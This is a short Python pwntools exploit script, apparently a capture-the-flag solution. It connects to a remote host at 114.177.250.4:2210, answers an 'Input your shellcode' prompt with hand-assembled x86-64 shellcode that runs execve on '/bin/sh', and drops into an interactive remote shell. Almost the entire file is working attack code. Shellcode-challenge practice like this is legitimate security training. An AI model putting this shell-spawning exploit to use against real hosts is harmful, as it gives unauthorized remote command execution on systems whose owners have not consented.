#!/usr/bin/env python

from pwn import *

context.update(arch="amd64", os="linux", bits=64)
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "DEBUG"

# elf = context.binary = ELF('./problem')
# p = process(elf.path)
# gdb.attach(proc.pidof(p)[0])

p = remote('114.177.250.4', 2210)

shellcode = asm("""
        mov rdi, [rax]
        add rdi, 13
        lea rax, [rbx + 0x3b]
        syscall
        .ascii "/bin/sh"
""")

p.recvuntil("Input your shellcode: ")

print(disasm(shellcode))

p.send(shellcode)
p.interactive()
